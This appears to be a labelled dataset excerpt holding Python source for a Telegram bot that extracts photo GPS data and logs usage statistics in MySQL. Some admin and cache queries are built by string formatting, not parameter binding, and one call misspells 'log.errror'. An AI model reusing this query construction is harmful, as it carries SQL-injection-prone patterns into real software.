MySQL server during query)\n            # (2006, Server has gone away)\n            if e.args[0] in [2006, 2013]:\n                log.info(e)\n                # log.debug(\"Connecting to the MySQL again...\")\n\n                self.connect()\n                if trials > 3:\n                    log.error(e)\n                    log.warning(\"Ran out of limit of trials...\")\n                    raise DatabaseConnectionError(\"Cannot connect to the \"\n                                                  \"database\")\n\n                trials += 1\n                # trying to execute query one more time\n                log.warning(e)\n                log.info(\"Trying execute the query again...\")\n                return self.execute_query(query, parameters, trials)\n            else:\n                log.error(e)\n                raise\n        except Exception as e:\n            log.error(e)\n            raise\n        else:\n            return cursor\n\n    def add(self, query, parameters=None):\n        \"\"\"\n        Shortcut to add something to a database\n        :param query: query to execute\n        :param parameters: parameters for query\n        :return: boolean - True if the method succeeded and False otherwise\n        \"\"\"\n\n        try:\n            self.execute_query(query, parameters)\n            self.conn.commit()\n        except Exception as e:\n            log.errror(e)\n            raise DatabaseError(\"Cannot add your data to the database!\")\n\n    def disconnect(self):\n        \"\"\"\n        Closes the connection to the database and ssh tunnel if needed\n        :return: True if succeeded\n        \"\"\"\n        if self.conn:\n            self.conn.close()\n            log.info('Connection to the database has been closed.')\n        if self.tunnel:\n            self.tunnel.stop()\n            log.info('SSH tunnel has been closed.')\n        self.tunnel_opened = False\n        return True\n\n    def __str__(self):\n        return (f'Instance of a connector to the database. '\n                f'The connection is {\"opened\" if self.conn else \"closed\"}. '\n                f'SSH tunnel is {\"opened\" if self.tunnel_opened else \"closed\"}'\n                '.')\n/n/n/nphotogpsbot/process_image.py/n/nfrom dataclasses import dataclass\nfrom typing import Dict\n\nimport exifread\nfrom exifread.classes import IfdTag\nfrom geopy.geocoders import Nominatim\n\nfrom photogpsbot import bot, log, db, User\n\n\nclass InvalidCoordinates(Exception):\n    \"\"\"\n    Coordinates have invalid format\n    \"\"\"\n\n\nclass NoCoordinates(Exception):\n    \"\"\"\n    There is no location info\n    \"\"\"\n\n\nclass NoEXIF(Exception):\n    \"\"\"\n    Means that there is no EXIF within the photo at all\n\n    \"\"\"\n\n\nclass NoData(Exception):\n    \"\"\"\n    Means that there is actually no any data of our interest within the picture\n\n    \"\"\"\n\n\n@dataclass\nclass ImageData:\n    \"\"\"\n    A class to store info about a photo from user.\n    \"\"\"\n    user: User\n    date_time: str = None\n    camera: str = None\n    lens: str = None\n    address: str = None\n    country: Dict[str, str] = None\n    latitude: float = None\n    longitude: float = None\n\n\n@dataclass\nclass RawImageData:\n    \"\"\"\n    Raw data from photo that is still have to be converted in order to be used.\n    \"\"\"\n    user: User\n    date_time: str = None\n    camera_brand: str = None\n    camera_model: str = None\n    lens_brand: str = None\n    lens_model: str = None\n    latitude_reference: str = None\n    raw_latitude: IfdTag = None\n    longitude_reference: str = None\n    raw_longitude: IfdTag = None\n\n\nclass ImageHandler:\n\n    def __init__(self, user, file):\n        self.user = user\n        self.file = file\n        self.raw_data = None\n\n    @staticmethod\n    def _get_raw_data(file):\n        \"\"\"\n        Get name of the camera and lens, the date when the photo was taken\n        and raw coordinates (which later will be converted)\n        :param file: byte sting with an image\n        :return: RawImageData object with raw info from the photo\n        \"\"\"\n        # Get data from the exif of the photo via external library\n        exif = exifread.process_file(file, details=False)\n        if not len(exif.keys()):\n            reason = \"This picture doesn't contain EXIF.\"\n            log.info(reason)\n            raise NoEXIF(reason)\n\n        # Get info about camera ang lend from EXIF\n        date_time = exif.get('EXIF DateTimeOriginal', None)\n        date_time = str(date_time) if date_time else None\n        camera_brand = str(exif.get('Image Make', ''))\n        camera_model = str(exif.get('Image Model', ''))\n        lens_brand = str(exif.get('EXIF LensMake', ''))\n        lens_model = str(exif.get('EXIF LensModel', ''))\n\n        if not any([date_time, camera_brand, camera_model, lens_brand,\n                    lens_model]):\n            # Means that there is actually no any data of our interest\n            reason = 'There is no data of interest in this photo'\n            log.info(reason)\n            raise NoData(reason)\n\n        try:  # Extract coordinates from EXIF\n            latitude_reference = str(exif['GPS GPSLatitudeRef'])\n            raw_latitude = exif['GPS GPSLatitude']\n            longitude_reference = str(exif['GPS GPSLongitudeRef'])\n            raw_longitude = exif['GPS GPSLongitude']\n\n        except KeyError:\n            log.info(\"This picture doesn't contain coordinates.\")\n            # returning info about the photo without coordinates\n            return (date_time, camera_brand, camera_model,\n                    lens_brand, lens_model)\n        else:\n            # returning info about the photo with its coordinates\n            return (date_time, camera_brand, camera_model,\n                    lens_brand, lens_model, latitude_reference, raw_latitude,\n                    longitude_reference, raw_longitude)\n\n    @staticmethod\n    def _dedupe_string(string):\n        \"\"\"\n        Get rid of all repetitive words in a string\n        :param string: string with camera or lens names\n        :return: same string without repetitive words\n        \"\"\"\n\n        deduped_string = ''\n\n        for x in string.split(' '):\n            if x not in deduped_string:\n                deduped_string += x + ' '\n        return deduped_string.rstrip()\n\n    @staticmethod\n    def _check_camera_tags(tags):\n        \"\"\"\n        Function that convert stupid code name of a smartphone or camera\n        from EXIF to meaningful one by looking a collation in a special MySQL\n        table For example instead of just Nikon there can be\n        NIKON CORPORATION in EXIF\n\n        :param tags: name of a camera and lens from EXIF\n        :return: list with one or two strings which are name of\n        camera and/or lens. If there is not better name for the gadget\n        in database, function just returns name how it is\n        \"\"\"\n        checked_tags = []\n\n        for tag in tags:\n            if tag:  # If there was this information inside EXIF of the photo\n                tag = str(tag).strip()\n                log.info('Looking up collation for %s', tag)\n                query = ('SELECT right_tag '\n                         'FROM tag_table '\n                         'WHERE wrong_tag=%s')\n                parameters = tag,\n                cursor = db.execute_query(query, parameters)\n                if not cursor:\n                    log.error(\"Can't check the tag because of the db error\")\n                    log.warning(\"Tag will stay as is.\")\n                    continue\n                if cursor.rowcount:\n                    # Get appropriate tag from the table\n                    tag = cursor.fetchone()[0]\n                    log.info('Tag after looking up in tag_tables - %s.', tag)\n\n            checked_tags.append(tag)\n        return checked_tags\n\n    @staticmethod\n    def _get_dd_coordinate(angular_distance, reference):\n        \"\"\"\n         Convert coordinates from format in which they are typically written\n         in EXIF to decimal degrees - format that Telegram or Google Map\n         understand. Google coordinates, EXIF and decimals degrees if you\n         need to understand what is going on here\n\n         :param angular_distance: ifdTag object from the exifread module -\n         it contains a raw coordinate - either longitude or latitude\n         :param reference:\n          :return: a coordinate in decimal degrees format\n         \"\"\"\n        ag = angular_distance\n        degrees = ag.values[0].num / ag.values[0].den\n        minutes = (ag.values[1].num / ag.values[1].den) / 60\n        seconds = (ag.values[2].num / ag.values[2].den) / 3600\n\n        if reference in 'WS':\n            return -(degrees + minutes + seconds)\n\n        return degrees + minutes + seconds\n\n    def _convert_coordinates(self, raw_data):\n        \"\"\"\n        # Convert GPS coordinates from format in which they are stored in\n        EXIF of photo to format that accepts Telegram (and Google Maps for\n        example)\n\n        :param data: EXIF data extracted from photo\n        :param chat_id: user id\n        :return: either floats that represents longitude and latitude or\n        string with error message dedicated to user\n        \"\"\"\n\n        # Return positive or negative longitude/latitude from exifread's ifdtag\n\n        try:\n            latitude = self._get_dd_coordinate(raw_data.raw_latitude,\n                                               raw_data.latitude_reference)\n            longitude = self._get_dd_coordinate(raw_data.raw_longitude,\n                                                raw_data.longitude_reference)\n\n        except Exception as e:\n            # todo also find out the error in case there is no coordinates in\n            #  raw_data\n            log.error(e)\n            log.error('Cannot read coordinates of this photo.')\n            raw_coordinates = (f'Latitude reference: '\n                               f'{raw_data.latitude_reference}\\n'\n                               f'Raw latitude: {raw_data.raw_latitude}.\\n'\n                               f'Longitude reference: '\n                               f'{raw_data.longitude_reference} '\n                               f'Raw longitude: {raw_data.raw_longitude}.\\n')\n            log.info(raw_coordinates)\n            raise InvalidCoordinates\n\n        else:\n            return latitude, longitude\n\n    @staticmethod\n    def _get_address(latitude, longitude):\n\n        \"\"\"\n         # Get address as a string by coordinates from photo that user sent\n         to bot\n        :param latitude:\n        :param longitude:\n        :return: address as a string where photo was taken; name of\n        country in English and Russian to keep statistics\n        of the most popular countries among users of the bot\n        \"\"\"\n\n        address = {}\n        country = {}\n        coordinates = f\"{latitude}, {longitude}\"\n        log.debug('Getting address from coordinates %s...', coordinates)\n        geolocator = Nominatim()\n\n        try:\n            # Get name of the country in English and Russian language\n            location = geolocator.reverse(coordinates, language='en')\n            address['en-US'] = location.address\n            country['en-US'] = location.raw['address']['country']\n\n            location2 = geolocator.reverse(coordinates, language='ru')\n            address['ru-RU'] = location2.address\n            country['ru-RU'] = location2.raw['address']['country']\n            return address, country\n\n        except Exception as e:\n            log.error('Getting address has failed!')\n            log.error(e)\n            raise\n\n    def _convert_data(self, raw_data):\n        date_time = (str(raw_data.date_time) if raw_data.date_time else None)\n\n        # Merge a brand and model together\n        camera = f'{raw_data.camera_brand} {raw_data.camera_model}'\n        lens = f'{raw_data.lens_brand} {raw_data.lens_model}'\n\n        # Get rid of repetitive words\n        camera = (self._dedupe_string(camera) if camera != ' ' else None)\n        lens = (self._dedupe_string(lens) if lens != ' ' else None)\n\n        camera, lens = self._check_camera_tags([camera, lens])\n\n        try:\n            latitude, longitude = self._convert_coordinates(raw_data)\n        except (InvalidCoordinates, NoCoordinates):\n            address = country = latitude = longitude = None\n        else:\n            try:\n                address, country = self._get_address(latitude, longitude)\n            except Exception as e:\n                log.warning(e)\n                address = country = None\n\n        return date_time, camera, lens, address, country, latitude, longitude\n\n    def get_image_info(self):\n        \"\"\"\n        Read data from photo and prepare answer for user\n        with location and etc.\n        \"\"\"\n        raw_data = RawImageData(self.user, *self._get_raw_data(self.file))\n        image_data = ImageData(self.user, *self._convert_data(raw_data))\n\n        return image_data\n/n/n/nphotogpsbot/users.py/n/n\"\"\"\nModule to manage users of bot: store and update information, interact with\nthe database, keep tack of and switch language of interface for user\n\"\"\"\n\nimport config\nfrom photogpsbot import bot, log, db\nfrom photogpsbot.db_connector import DatabaseError, DatabaseConnectionError\n\nfrom telebot.types import Message\n\nclass User:\n    \"\"\"\n    Class that describes one user of this Telegram bot and helps to store basic\n    info about him and his language of choice for interface of the bot\n    \"\"\"\n    def __init__(self, chat_id, first_name, nickname, last_name,\n                 language='en-US'):\n        self.chat_id = chat_id\n        self.first_name = first_name\n        self.nickname = nickname\n        self.last_name = last_name\n        self.language = language\n\n    def set_language(self, lang):\n        \"\"\"\n        Update language of user in the User object and in the database\n        :param lang: string with language tag like \"en-US\"\n        :return: None\n        \"\"\"\n        log.debug('Updating info about user %s language '\n                  'in memory & database...', self)\n\n        self.language = lang\n\n        query = (\"UPDATE users \"\n                 f\"SET language=%s \"\n                 f\"WHERE chat_id=%s\")\n\n        parameters = self.language, self.chat_id\n        try:\n            db.add(query, parameters)\n        except DatabaseError:\n            log.error(\"Can't add new language of %s to the database\", self)\n        else:\n            log.debug('Language updated.')\n\n    def switch_language(self):\n        \"\"\"\n        Switch language from Russian to English or conversely\n        :return: string with language tag like \"en-US\" to be used for\n        rendering menus and messages for user\n        \"\"\"\n        curr_lang = self.language\n        new_lang = 'ru-RU' if self.language == 'en-US' else 'en-US'\n        log.info('Changing user %s language from %s to %s...', self,\n                 curr_lang, new_lang)\n\n        self.set_language(new_lang)\n\n        return new_lang\n\n    def __str__(self):\n        return (f'{self.first_name} {self.nickname} {self.last_name} '\n                f'({self.chat_id}) preferred language: {self.language}')\n\n    def __repr__(self):\n        return (f'{self.__class__.__name__}(chat_id={self.chat_id}, '\n                f'first_name=\"{self.first_name}\", nickname=\"{self.nickname}\", '\n                f'last_name=\"{self.last_name}\", language=\"{self.language}\")')\n\n\nclass Users:\n    \"\"\"\n    Class for managing users of the bot: find them, add to system,\n    cache them from the database, check whether user changed his info etc\n    \"\"\"\n    def __init__(self):\n        self.users = {}\n\n    @staticmethod\n    def get_total_number():\n        \"\"\"\n        Count the total number of users in the database\n        :return: integer which is the total number of users\n        \"\"\"\n        query = \"SELECT COUNT(*) FROM users\"\n        try:\n            cursor = db.execute_query(query)\n        except DatabaseConnectionError:\n            log.error(\"Can't count the total number of users!\")\n            raise\n\n        return cursor.fetchone()[0]\n\n    @staticmethod\n    def get_last_active_users(limit):\n        \"\"\"\n        Get from the database a tuple of users who have been recently using\n        the bot\n        :param limit: integer that specifies how much users to get\n        :return: tuple of tuples with users info\n        \"\"\"\n        log.info('Evaluating last active users with date of '\n                 'last time when they used bot...')\n\n        # From photo_queries_table2 we take chat_id of the last\n        # active users and from 'users' table we take info about these\n        # users by chat_id which is a foreign key\n        query = ('SELECT p.chat_id, u.first_name, u.nickname, u.last_name, '\n                 'u.language '\n                 'FROM photo_queries_table2 p '\n                 'INNER JOIN users u '\n                 'ON p.chat_id = u.chat_id '\n                 'GROUP BY u.chat_id, u.first_name, u.nickname, u.last_name, '\n                 'u.language '\n                 'ORDER BY MAX(time)'\n                 f'DESC LIMIT %s')\n\n        parameters = limit,\n\n        try:\n            cursor = db.execute_query(query, parameters)\n        except DatabaseConnectionError:\n            log.error(\"Cannot get the last active users because of some \"\n                      \"problems with the database\")\n            raise\n\n        last_active_users = cursor.fetchall()\n        return last_active_users\n\n    def cache(self, limit):\n        \"\"\"\n        Caches last active users from database to a dictionary inside object of\n        this class\n        :param limit: limit of entries to be cached\n        :return: None\n        \"\"\"\n\n        log.debug(\"Start caching last active users from the DB...\")\n\n        try:\n            last_active_users = self.get_last_active_users(limit)\n        except DatabaseConnectionError:\n            log.error(\"Cannot cache users!\")\n            return\n\n        for items in last_active_users:\n            # if chat_id of a user is not known to the program\n            if items[0] not in self.users:\n                # adding users from database to the \"cache\"\n                self.users[items[0]] = User(*items)\n                log.debug(\"Caching user: %s\", self.users[items[0]])\n        log.info('Users have been cached.')\n\n    def clean_cache(self, limit):\n        \"\"\"\n        Method that remove several User objects from cache - the least \n        active users\n        :param limit: number of the users that the method should remove\n        from cache\n        :return: None\n        \"\"\"\n\n        log.info('Figuring out the least active users...')\n        # Select users that the least active recently\n        user_ids = tuple(self.users.keys())\n        query = ('SELECT chat_id '\n                 'FROM photo_queries_table2 '\n                 f'WHERE chat_id in {user_ids} '\n                 'GROUP BY chat_id '\n                 'ORDER BY MAX(time) '\n                 f'LIMIT %s')\n\n        parameters = limit,\n\n        try:\n            cursor = db.execute_query(query, parameters)\n        except DatabaseConnectionError:\n            log.error(\"Can't figure out the least active users...\")\n            return\n\n        if not cursor.rowcount:\n            log.warning(\"There are no users in the db\")\n            return\n\n        # Make list out of tuple of tuples that is returned by MySQL\n        least_active_users = [chat_id[0] for chat_id in cursor.fetchall()]\n        log.info('Removing %d least active users from cache...', limit)\n        num_deleted_entries = 0\n        for entry in least_active_users:\n            log.debug('Deleting %s...', entry)\n            deleted_entry = self.users.pop(entry, None)\n            if deleted_entry:\n                num_deleted_entries += 1\n        log.debug(\"%d users were removed from cache.\", num_deleted_entries)\n\n    @staticmethod\n    def _add_to_db(user):\n        \"\"\"\n        Adds User object to the database\n        :param user: User object with info about user\n        :return: None\n        \"\"\"\n        query = (\"INSERT INTO users (chat_id, first_name, nickname, \"\n                 \"last_name, language) \"\n                 f\"VALUES (%s, %s, %s, %s, %s)\")\n\n        parameters = (user.chat_id, user.first_name, user.nickname,\n                      user.last_name, user.language)\n\n        try:\n            db.add(query, parameters)\n        except DatabaseError:\n            log.error(\"Cannot add user to the database\")\n        else:\n            log.info(f\"User {user} was successfully added to the users db\")\n\n    def add_new_one(self, chat_id, first_name, nickname, last_name, language,\n                    add_to_db=True):\n        \"\"\"\n        Function to add a new User in dictionary with users and to the database\n        at one fell swoop\n        :param chat_id: id of a Telegram user\n        :param first_name: first name of a Telegram user\n        :param nickname: nickname of a Telegram user\n        :param last_name: last name of a Telegram user\n        :param language: preferred language of a Telegram user\n        :param add_to_db: whether of not to add user to the database (for\n        example, if bot is caching users from the database, there is clearly\n        no point to add them back to the database)\n        :return: User object with info about the added user\n        \"\"\"\n        user = User(chat_id, first_name, nickname, last_name, language)\n        self.users[chat_id] = user\n        if add_to_db:\n            self._add_to_db(user)\n        return user\n\n    @staticmethod\n    def compare_and_update(user, message):\n        \"\"\"\n        This method compare a user object from the bot and his info from\n        the Telegram message to check whether a user has changed his bio\n        or not. If yes, the user object that represents him in the bot will\n        be updated accordingly. Now this function is called only when a user\n        asks the bot for showing the most popular cams\n\n        :param user: user object that represents a Telegram user in this bot\n        :param message: object from Telegram that contains info about user's\n        message and about himself\n        :return: None\n        \"\"\"\n\n        log.info('Checking whether user have changed his info or not...')\n        msg = message.from_user\n        usr_from_message = User(message.chat.id, msg.first_name, msg.username,\n                                msg.last_name)\n\n        if user.chat_id != usr_from_message.chat_id:\n            log.error(\"Wrong user to compare!\")\n            return\n\n        if user.first_name != usr_from_message.first_name:\n            user.first_name = usr_from_message.first_name\n\n        elif user.nickname != usr_from_message.nickname:\n            user.nickname = usr_from_message.nickname\n\n        elif user.last_name != usr_from_message.last_name:\n            user.last_name = usr_from_message.last_name\n\n        else:\n            log.debug(\"User's info hasn't changed\")\n            return\n\n        log.info(\"User has changed his info\")\n        log.debug(\"Updating user's info in the database...\")\n        query = (f\"UPDATE users \"\n                 f\"SET first_name=%s, \"\n                 f\"nickname=%s, \"\n                 f\"last_name=%s \"\n                 f\"WHERE chat_id=%s\")\n\n        parameters = (user.first_name, user.nickname, user.last_name,\n                      user.chat_id)\n\n        try:\n            db.add(query, parameters)\n        except DatabaseError:\n            log.error(\"Could not update info about %s in the database\",\n                      user)\n        else:\n            log.debug(\"User's info has been updated\")\n\n    def find_one(self, message: Message) -> User:\n        \"\"\"\n        Look up a user by a message which we get together with request\n        from Telegram\n        :param message: object from Telegram that contains info about user's\n        message and about himself\n        :return: user object that represents a Telegram user in this bot\n        \"\"\"\n\n        # look up user in the cache of the bot\n        user = self.users.get(message.chat.id, None)\n\n        if user:\n            return user\n\n        # otherwise look up the user in the database\n        log.debug(\"Looking up the user in the database as it doesn't \"\n                  \"appear in cache\")\n        query = (f'SELECT first_name, nickname, last_name, language '\n                 f'FROM users '\n                 f'WHERE chat_id=%s')\n\n        parameters = message.chat.id,\n        try:\n            cursor = db.execute_query(query, parameters)\n        except DatabaseConnectionError:\n\n            # Even if the database in unreachable add user to dictionary\n            # with users otherwise the bot will crash requesting this\n            # user's info\n            log.error('Cannot lookup the user with chat_id %d in database',\n                      message.chat.id)\n            msg = message.from_user\n            user = self.add_new_one(message.chat.id, msg.first_name,\n                                    msg.last_name, msg.username,\n                                    language='en-US', add_to_db=False)\n            return user\n\n        if not cursor.rowcount:\n            # This user uses our photoGPSbot for the first time as we\n            # can't find him in the database\n            log.info('Adding totally new user to the system...')\n            msg = message.from_user\n            user = self.add_new_one(message.chat.id, msg.first_name,\n                                    msg.last_name, msg.username,\n                                    language='en-US')\n            bot.send_message(config.MY_TELEGRAM,\n                             text=f'You have a new user! {user}')\n            log.info('You have a new user! Welcome %s', user)\n\n        # finally if the user wasn't found in the cache of the bot, but was\n        # found in the database\n        else:\n            log.debug('User %d has been found in the database',\n                      message.chat.id)\n\n            user_data = cursor.fetchall()[0]\n            user = self.add_new_one(message.chat.id, *user_data,\n                                    add_to_db=False)\n\n        return user\n\n    def __str__(self):\n        return ('Instance of a handler of users. '\n                f'There is {len(self.users)} users in cache right now.')\n/n/n/n", "label": 0}, {"id": "0e9f57f13e61863b3672f5730e27f149da00786a", "code": "/photogpsbot/__main__.py/n/n\"\"\"\nSmall bot for Telegram that receives your photo and returns you map where\nit was taken.\nWritten by Aleksandr Mikheev.\nhttps://github.com/RandyRomero/photogpsbot\n\nThis specific module contains methods to respond user messages, to make\ninteractive menus, to handle user language, to process user images\n\"\"\"\n\n# todo fix database queries in order to user parameters binding!\n\n# todo check what is wrong with geopy on\n#  last versions (some deprecation warning)\n\n# todo rewrite the processing of images\n# todo update docstrings and comments\n\nfrom io import BytesIO\nfrom datetime import datetime, timedelta\n\nfrom telebot import types\nimport requests\n\nfrom photogpsbot import bot, log, log_files, db, User, users, messages, machine\nfrom photogpsbot.process_image import ImageHandler\nfrom photogpsbot.db_connector import DatabaseConnectionError\nimport config\n\n\nclass PhotoMessage:\n    def __init__(self, message, user):\n        self.message = message\n        self.user = user\n        self.image_handler = ImageHandler\n\n    @staticmethod\n    def open_photo(message):\n        # Get temporary link to a photo that user sends to the bot\n        file_path = bot.get_file(message.document.file_id).file_path\n\n        # Download photo that got the bot from a user\n        link = (\"https://api.telegram.org/file/\"\n                f\"bot{config.TELEGRAM_TOKEN}/{file_path}\")\n\n        if machine == 'prod':\n            r = requests.get(link)\n        else:\n            # use proxy if the bot is running not on production server\n            proxies = {'https': config.PROXY_CONFIG}\n            r = requests.get(link, proxies=proxies)\n\n        # Get file-like object of user's photo\n        return BytesIO(r.content)\n\n    def get_info(self):\n        \"\"\"\n        Opens file that user sent as a file-like object, get necessary info\n        from it and return it\n\n        :return: instance of ImageData - my dataclass for storing info about\n        an image like user, date, camera name etc\n        \"\"\"\n        user_photo = self.open_photo(self.message)\n        image = self.image_handler(self.user, user_photo)\n        return image.get_image_info()\n\n    def save_info_to_db(self, image_data):\n        \"\"\"\n           When user send photo as a file to get information, bot also stores\n           information about this query to the database to keep statistics that\n           can be shown to a user in different ways. It stores time of query,\n           Telegram id of a user, his camera and lens which were used for\n           taking photo, his first and last name, nickname and country where\n           the photo was taken. The bot does not save photos or their\n           coordinates.\n\n           :image_data: an instance of ImageData dataclass with info about\n           the image\n           :return: None\n           \"\"\"\n        camera_name, lens_name = image_data.camera, image_data.lens\n        camera_name = f'\"{camera_name}\"' if camera_name else None\n        lens_name = f'\"{lens_name}\"' if lens_name else None\n\n        if not image_data.country:\n            country_en = country_ru = None\n        else:\n            country_en = f'\"{image_data.country[\"en-US\"]}\"'\n            country_ru = f'\"{image_data.country[\"ru-RU\"]}\"'\n\n        log.info('Adding user query to photo_queries_table...')\n\n        query = ('INSERT INTO photo_queries_table '\n                 '(chat_id, camera_name, lens_name, country_en, country_ru) '\n                 'VALUES (%s, %s, %s, %s, %s)')\n\n        parameters = (self.user.chat_id, camera_name, lens_name, country_en,\n                      country_ru)\n\n        db.execute_query(query, parameters)\n        db.conn.commit()\n        log.info('User query was successfully added to the database.')\n\n    @staticmethod\n    def find_num_users_with_same_feature(image_data):\n        same_feature = []\n\n        feature_types = ('camera_name', 'lens_name', 'country_en')\n        features = (image_data.camera, image_data.lens, image_data.country['en-US'])\n\n        for feature_name, feature in zip(feature_types, features):\n            if not feature:\n                same_feature.append(0)\n                continue\n            answer = get_number_users_by_feature(feature, feature_name)\n            same_feature.append(answer)\n\n        return same_feature\n\n    def prepare_answer(self):\n        \"\"\"\n        Process an image that user sent, get info from it, save data to the\n        database, make an answer to be sent via Telegram\n        :return:\n        \"\"\"\n\n        # Get instance of the dataclass ImageData with info about the image\n        image_data = self.get_info()\n        # Save some general info about the user's query to the database\n        self.save_info_to_db(image_data)\n\n        answer = ''\n        coordinates = image_data.latitude, image_data.longitude\n        if not coordinates[0]:\n            answer += messages[self.user.language][\"no_gps\"]\n\n        answ_template = messages[self.user.language][\"camera_info\"]\n        basic_data = (image_data.date_time, image_data.camera, image_data.lens,\n                      image_data.address[self.user.language])\n\n        # Concatenate templates in language that user prefer with information\n        # from the photo, for example: f'{\"Camera brand\"}:{\"Canon 60D\"}'\n        for arg in zip(answ_template, basic_data):\n            if arg[1]:\n                answer += f'*{arg[0]}*: {arg[1]}\\n'\n\n        lang = self.user.language\n        lang_templates = messages[lang][\"users with the same feature\"].values()\n        ppl_wth_same_featrs = self.find_num_users_with_same_feature(image_data)\n        for template, feature in zip(lang_templates, ppl_wth_same_featrs):\n            if feature:\n                answer += f'{template} {feature}\\n'\n\n        return coordinates, answer\n\n\ndef get_admin_stat(command):\n    # Function that returns statistics to admin by command\n    error_answer = \"Can't execute your command. Check logs\"\n    answer = 'There is some statistics for you: \\n'\n\n    # Set to a beginning of the day\n    today = (datetime\n             .today()\n             .replace(hour=0, minute=0, second=0, microsecond=0)\n             .strftime('%Y-%m-%d %H:%M:%S'))\n\n    # Last users with date of last time when they used bot\n    if command == 'last active users':\n\n        try:\n            last_active_users = users.get_last_active_users(100)\n        except DatabaseConnectionError:\n            return error_answer\n\n        bot_users = ''\n        # Makes a human readable list of last active users\n        for usr, index in zip(last_active_users,\n                              range(len(last_active_users))):\n            user = User(*usr)\n            bot_users += f'{index + 1}. {user}\\n'\n\n        answer = ('Up to 100 last active users by the time when they sent '\n                  'picture last time:\\n')\n        answer += bot_users\n        log.info('Done.')\n        return answer\n\n    elif command == 'total number photos sent':\n        log.info('Evaluating total number of photo queries in database...')\n        query = ('SELECT COUNT(chat_id) '\n                 'FROM photo_queries_table2')\n        try:\n            cursor = db.execute_query(query)\n        except DatabaseConnectionError:\n            return error_answer\n        answer += '{} times users sent photos.'.format(cursor.fetchone()[0])\n        query = ('SELECT COUNT(chat_id) '\n                 'FROM photo_queries_table2 '\n                 'WHERE chat_id !={}'.format(config.MY_TELEGRAM))\n        try:\n            cursor = db.execute_query(query)\n        except DatabaseConnectionError:\n            answer += (\"\\nCannot calculate number of photos that were send \"\n                       \"excluding your photos. Check logs\")\n            return answer\n\n        answer += '\\nExcept you: {} times.'.format(cursor.fetchone()[0])\n        log.info('Done.')\n        return answer\n\n    elif command == 'photos today':\n        # Show how many photos have been sent since 00:00:00 of today\n        log.info('Evaluating number of photos which were sent today.')\n        query = (\"SELECT COUNT(chat_id) \"\n                 \"FROM photo_queries_table2 \"\n                 \"WHERE time > '{}'\".format(today))\n        try:\n            cursor = db.execute_query(query)\n        except DatabaseConnectionError:\n            return error_answer\n        answer += f'{cursor.fetchone()[0]} times users sent photos today.'\n        query = (\"SELECT COUNT(chat_id) \"\n                 \"FROM photo_queries_table2 \"\n                 \"WHERE time > '{}' \"\n                 \"AND chat_id !={}\".format(today, config.MY_TELEGRAM))\n        try:\n            cursor = db.execute_query(query)\n        except DatabaseConnectionError:\n            return error_answer\n\n        answer += '\\nExcept you: {} times.'.format(cursor.fetchone()[0])\n        log.info('Done.')\n        return answer\n\n    elif command == 'number of users':\n        # Show number of users who has used bot at leas\"\n        # once or more (first for the whole time, then today)\n        log.info('Evaluating number of users that use bot '\n                 'since the first day and today...')\n        try:\n            num_of_users = users.get_total_number()\n        except DatabaseConnectionError:\n            return error_answer\n\n        answer += f'There are totally {num_of_users} users.'\n\n        query = (\"SELECT COUNT(DISTINCT chat_id) \"\n                 \"FROM photo_queries_table2 \"\n                 \"WHERE time > '{}'\".format(today))\n        try:\n            cursor = db.execute_query(query)\n        except DatabaseConnectionError:\n            answer += (\"\\nCannot calculate how many user have sent their \"\n                       \"photos today\")\n            return answer\n\n        answer += f'\\n{cursor.fetchone()[0]} users have sent photos today.'\n        log.info('Done.')\n        return answer\n\n    elif command == 'number of gadgets':\n        # To show you number smartphones + cameras in database\n        log.info('Evaluating number of cameras and smartphones in database...')\n        query = ('SELECT COUNT(DISTINCT camera_name) '\n                 'FROM photo_queries_table2')\n        try:\n            cursor = db.execute_query(query)\n        except DatabaseConnectionError:\n            return error_answer\n        answer += (f'There are totally {cursor.fetchone()[0]} '\n                   f'cameras/smartphones.')\n        query = (\"SELECT COUNT(DISTINCT camera_name) \"\n                 \"FROM photo_queries_table2 \"\n                 \"WHERE time > '{}'\".format(today))\n        try:\n            cursor = db.execute_query(query)\n        except DatabaseConnectionError:\n            answer += (\"Cannot calculate the number of gadgets that have been \"\n                       \"used today so far\")\n            return answer\n\n        answer += (f'\\n{cursor.fetchone()[0]} cameras/smartphones '\n                   'were used today.')\n        log.info('Done.')\n        return answer\n\n    elif command == 'uptime':\n        fmt = 'Uptime: {} days, {} hours, {} minutes and {} seconds.'\n        td = datetime.now() - bot.start_time\n        # datetime.timedelta.seconds returns you total number of seconds\n        # since given time, so you need to perform\n        # a little bit of math to make whole hours, minutes and seconds from it\n        # And there isn't any normal way to do it in Python unfortunately\n        uptime = fmt.format(td.days, td.seconds // 3600, td.seconds % 3600 //\n                            60, td.seconds % 60)\n        log.info(uptime)\n        return uptime\n\n\n@bot.message_handler(commands=['start'])\ndef create_main_keyboard(message):\n    user = users.find_one(message)\n    current_user_lang = user.language\n    markup = types.ReplyKeyboardMarkup(one_time_keyboard=True,\n                                       resize_keyboard=True)\n    markup.row('\u0420\u0443\u0441\u0441\u043a\u0438\u0439/English')\n    markup.row(messages[current_user_lang]['top_cams'])\n    markup.row(messages[current_user_lang]['top_lens'])\n    markup.row(messages[current_user_lang]['top_countries'])\n    bot.send_message(user.chat_id, messages[current_user_lang]['menu_header'],\n                     reply_markup=markup)\n\n\n# Decorator to handle text messages\n@bot.message_handler(content_types=['text'])\ndef handle_menu_response(message):\n    # keyboard_hider = telebot.types.ReplyKeyboardRemove()\n    current_user_lang = users.find_one(message).language\n    user = users.find_one(message)\n\n    if message.text == '\u0420\u0443\u0441\u0441\u043a\u0438\u0439/English':\n\n        new_lang = users.find_one(message).switch_language()\n        if current_user_lang != new_lang:\n            bot.send_message(user.chat_id, messages[new_lang]\n                             ['switch_lang_success'])\n            create_main_keyboard(message)\n        else:\n            bot.send_message(user.chat_id, messages[new_lang]\n                             ['switch_lang_failure'])\n            create_main_keyboard(message)\n\n    elif message.text == messages[current_user_lang]['top_cams']:\n        log.info('User %s asked for top cams', user)\n        bot.send_message(user.chat_id,\n                         text=get_most_popular_items('camera_name', message))\n        log.info('List of most popular cameras '\n                 'has been returned to %s', user)\n\n        # in order not to check whether user has changed his nickname or\n        # whatever every time his sends any request the bot will just check\n        # it every time a user wants to get a statistic about the most\n        # popular cameras\n        users.compare_and_update(user, message)\n\n    elif message.text == messages[current_user_lang]['top_lens']:\n        log.info('User %s asked for top lens', user)\n        bot.send_message(user.chat_id,\n                         text=get_most_popular_items('lens_name',\n                                                     message))\n        log.info('List of most popular lens has been returned to %s', user)\n\n    elif message.text == messages[current_user_lang]['top_countries']:\n        log.info('User %s asked for top countries', user)\n        lang_table_name = ('country_ru'\n                           if current_user_lang == 'ru-RU'\n                           else 